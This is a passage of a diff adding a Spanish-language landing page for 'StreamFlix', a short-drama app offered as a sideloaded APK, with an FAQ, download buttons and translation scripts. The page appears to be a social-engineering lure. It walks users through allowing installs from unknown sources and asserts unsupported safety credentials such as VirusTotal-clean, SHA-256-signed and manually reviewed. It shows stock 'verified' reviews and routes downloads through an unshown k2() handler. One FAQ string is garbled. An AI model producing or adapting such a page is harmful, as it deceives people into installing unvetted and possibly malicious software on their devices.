+  <p data-i18n="hero_desc">Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga y ve sin conexion. Nuevos dramas cada dia. Sin anuncios.</p>
+
+  <div class="download-btns">
+    <button class="dl-btn primary" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      <span data-i18n="hero_cta">Descargar Gratis — Ver Ahora</span>
+    </button>
+   
+  </div>
+
+ 
+
+<!-- ============================================================
+     FAQ
+     ============================================================ -->
+<section class="section reveal" style="padding-bottom:100px">
+  <div class="section-line"></div>
+  <div class="section-kicker" data-i18n="faq_label">Preguntas Frecuentes</div>
+  <h2 class="section-heading">
+    <span data-i18n="faq_h_a">¿Tienes preguntas?</span><br><em data-i18n="faq_h_b">Tenemos respuestas.</em>
+  </h2>
+
+  <div class="faq-stack" style="margin-top:16px">
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq1_q">¿Es seguro instalar el APK?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq1_a">Absolutamente. Cada version pasa por el analisis de VirusTotal (mas de 72 motores), firma de codigo SHA-256 y revision de seguridad manual antes de su publicacion. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tu mismo usando el hash publicado en nuestra pagina de seguridad.</div></div>
+    </div>
+
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq2_q">¿Por que la app no esta en Google Play o App Store?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq2_a">Estamos en una fase de iteracion rapida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribucion directa nos permite avanzar mas rapido sin los retrasos de revision de las tiendas de aplicaciones. Las publicaciones en tiendas estan planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones mas rapidas para ti.</div></div>
+    </div>
+
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq3_q">¿Como instalo el APK en Android?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq3_a">1. Toca el boton Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuracion → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizara automaticamente despues — no necesitas descargar manualmente versiones futuras.</div></div>
+    </div>
+
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq4_q">¿Es realmente gratis? ¿Cual es la trampa?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq4_a">Si — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia, el crecimiento llega solo. Las funciones premium (como descargas sin conexion) tambien son gratuitas durante nuestro periodo de lanzamiento. ¡Disfrutalas mientras dure!</div></div>
+    </div>
+
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq5_q">¿Que dispositivos y versiones de SO son compatibles?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq5_a">Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en telefonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia. Chromecast y AirPlay estan integrados.</div></div>
+    </div>
+
+    <div class="faq-entry">
+      <button class="faq-entry-q" onclick="toggleFaq(this)">
+        <span data-i18n="faq6_q">¿Como obtengo actualizaciones despues de instalar?</span>
+        <span class="faq-entry-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+      </button>
+      <div class="faq-entry-a"><div class="faq-entry-a-inner" data-i18n="faq6_a">La app tiene un actualizador automatico integrado. Cuando una nueva version este disponible, recibiras una notificacion dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta pagina ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="page-footer">
+  <span data-i18n="footer_copy">© 2026 StreamFlix</span> · <a href="#" data-i18n="footer_priv">Privacidad</a> · <a href="#" data-i18n="footer_terms">Terminos</a> · <a href="#" data-i18n="footer_sec">Seguridad</a>
+</footer>
+
+</div><!-- /page-content -->
+
+<!-- Floating bar -->
+<div class="float-bar" id="floatBar">
+  <button class="float-bar-btn" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    <span data-i18n="float_cta">Descargar Gratis</span>
+  </button>
+</div>
+
+<!-- ============================================================
+     SCRIPTS
+     ============================================================ -->
+
+
+<script>
+// ---- Floating bar ----
+var floatBar=document.getElementById('floatBar');
+function updateBar(){
+  if(window.scrollY>window.innerHeight*0.7){floatBar.classList.add('on')}
+  else{floatBar.classList.remove('on')}
+}
+window.addEventListener('scroll',updateBar,{passive:true});
+updateBar();
+
+// ---- Scroll reveal ----
+var revealObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}
+  });
+},{threshold:0.12,rootMargin:'0px 0px -30px 0px'});
+document.querySelectorAll('.reveal').forEach(function(el){revealObserver.observe(el)});
+
+// ---- FAQ ----
+function toggleFaq(q){
+  var item=q.parentElement;
+  var wasOpen=item.classList.contains('open');
+  document.querySelectorAll('.faq-entry').forEach(function(i){i.classList.remove('open')});
+  if(!wasOpen)item.classList.add('open');
+}
+</script>
+
+<!-- i18n -->
+<script>
+(function(){
+var T={
+es:{
+hero_eyebrow:'#1 App de Series Cortas · 2026',
+hero_title_a:'Dramas cortos,',
+hero_title_b:'emociones grandes',
+hero_desc:'Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga y ve sin conexión. Nuevos dramas cada día. Sin anuncios.',
+hero_stat1:'Usuarios',
+hero_stat2:'Series',
+hero_stat3:'Series Diarias',
+hero_cta:'Descargar Gratis — Ver Ahora',
+scroll_hint:'Desliza',
+trending_label:'Tendencias',
+trending_h_a:'Lo que todos',
+trending_h_b:'están viendo',
+trending_sub:'Series cortas más populares. Nuevas cada día.',
+card_hot:'POPULAR',
+card_new:'NUEVO',
+card_top:'TOP',
+card_4k:'4K',
+card_hd:'HD',
+live_titles:'Series',
+live_rating:'Estrellas',
+live_downloads:'Descargas',
+feat_label:'Por Qué Elegirnos',
+feat_h_a:'Todo lo que',
+feat_h_b:'diversión sin límites',
+feat1_h:'Episodios de 1 Min',
+feat1_p:'Cada episodio solo 60 segundos. Perfecto para cualquier momento libre.',
+feat2_h:'Modo Sin Conexión',
+feat2_p:'Descarga y ve sin conexión. Donde quieras, sin gastar datos.',
+feat3_h:'Formato Vertical',
+feat3_p:'Diseñado para tu móvil. Mira con una mano, sin girar la pantalla.',
+feat4_h:'Nuevos Estrenos Diarios',
+feat4_p:'Series nuevas cada día. Romance, drama, comedia — siempre hay algo fresco.',
+bigfeat_h:'⚡ Todo para tu serie corta',
+bigfeat_1:'<strong>Actualización Diaria</strong> — nuevas series y episodios cada 24 horas',
+bigfeat_2:'<strong>Recomendaciones IA</strong> — el algoritmo aprende lo que te gusta',
+bigfeat_3:'<strong>Géneros Ilimitados</strong> — romance, drama, acción, suspense y más',
+bigfeat_4:'<strong>Subtítulos IA</strong> — traducción en tiempo real en más de 40 idiomas',
+reviews_label:'Amado por Millones',
+reviews_h_a:'No creas solo',
+reviews_h_b:'nuestra palabra',
+review1:'"Por fin una app de series cortas que cumple. Los episodios de 1 minuto son perfectos para mis descansos. Ya no uso otras apps."',
+review2:'"Soy adicta a estas series. El formato vertical es súper cómodo y las recomendaciones siempre aciertan con lo que quiero ver."',
+review3:'"Descargo capítulos antes de salir y los veo en el metro sin gastar datos. La mejor app para momentos libres."',
+verified_user:'Usuario Verificado',
+stat1:'Descargas Totales',
+stat1_desc:'Descargas Totales',
+stat2:'Puntuación Media',
+stat3:'Países Disponibles',
+stat4:'Series Disponibles',
+sec_label:'Seguro y Verificado',
+sec_h_a:'Tu seguridad es',
+sec_h_b:'nuestra prioridad',
+sec_sub:'Cada versión es analizada, firmada y verificada antes de llegar a ti.',
+sec1_a:'VirusTotal Analizado',
+sec1_b:'100% limpio · 72 motores aprobados',
+sec2_a:'Firmado SHA-256',
+sec2_b:'Verificado criptográficamente · a prueba de manipulaciones',
+sec3_a:'Actualización Automática',
+sec3_b:'Recibe la última versión tan pronto como la publicamos',
+sec4_a:'Sin Abuso de Permisos',
+sec4_b:'Solo solicita lo estrictamente necesario',
+faq_label:'Preguntas Frecuentes',
+faq_h_a:'¿Tienes preguntas?',
+faq_h_b:'Tenemos respuestas.',
+faq1_q:'¿Es seguro instalar el APK?',
+faq1_a:'Absolutamente. Cada versión pasa por el análisis de VirusTotal (más de 72 motores), firma de código SHA-256 y revisión de seguridad manual antes de su publicación. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tú mismo usando el hash publicado en nuestra página de seguridad.',
+faq2_q:'¿Por qué la app no está en Google Play o Series?',
+faq2_a:'Estamos en una fase de iteración rápida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribución directa nos permite avanzar más rápido sin los retrasos de revisión de las tiendas de aplicaciones. Las publicaciones en tiendas están planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones más rápidas para ti.',
+faq3_q:'¿Cómo instalo el APK en Android?',
+faq3_a:'1. Toca el botón Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuración → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizará automáticamente después — no necesitas descargar manualmente versiones futuras.',
+faq4_q:'¿Es realmente gratis? ¿Cuál es la trampa?',
+faq4_a:'Sí — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia, el crecimiento llega solo. Las funciones premium (como descargas sin conexión) también son gratuitas durante nuestro período de lanzamiento. ¡Disfrútalas mientras dure!',
+faq5_q:'¿Qué dispositivos y versiones de SO son compatibles?',
+faq5_a:'Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en teléfonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia. Chromecast y AirPlay están integrados.',
+faq6_q:'¿Cómo obtengo actualizaciones después de instalar?',
+faq6_a:'La app tiene un actualizador automático integrado. Cuando una nueva versión esté disponible, recibirás una notificación dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta página ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.',
+footer_copy:'© 2026 StreamFlix',
+footer_priv:'Privacidad',
+footer_terms:'Términos',
+footer_sec:'Seguridad',
+float_cta:'Descargar Gratis'
+}
+};
+var lang=(function(){
+var p=window.location.pathname.toLowerCase();
+if(p.indexOf('estv')!==-1)return 'es';
+if(p.indexOf('index')!==-1)return 'en';
+var s=localStorage.getItem('sflix_lang');
+if(s==='en'||s==='es')return s;
+return 'en';
+})();
+function applyLanguage(l){
+document.documentElement.lang=l;
+var els=document.querySelectorAll('[data-i18n]');
+for(var i=0;i<els.length;i++){
+var k=els[i].getAttribute('data-i18n');
+if(T[l]&&T[l][k]!==undefined){
+var v=T[l][k];
+if(v.indexOf('<')!==-1&&v.indexOf('>')!==-1){
+els[i].innerHTML=v;
+}else{
+els[i].textContent=v;
+}
+}
+}
+var links=document.querySelectorAll('.lang-bar a');
+for(var j=0;j<links.length;j++){
+var ll=links[j].getAttribute('data-lang');
+if(ll===l){links[j].classList.add('active');}
+else{links[j].classList.remove('active');}
+}
+if(l==='es'){
+document.title='StreamFlix — Series Cortas en tu Bolsillo';
+var md=document.querySelector('meta[name="description"]');
+if(md)md.setAttribute('content','StreamFlix — Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga el APK gratis para Android. Sin anuncios.');
+}
+localStorage.setItem('sflix_lang',l);
+}
+applyLanguage('es');
+})();
+</script>
+</body>
+</html>
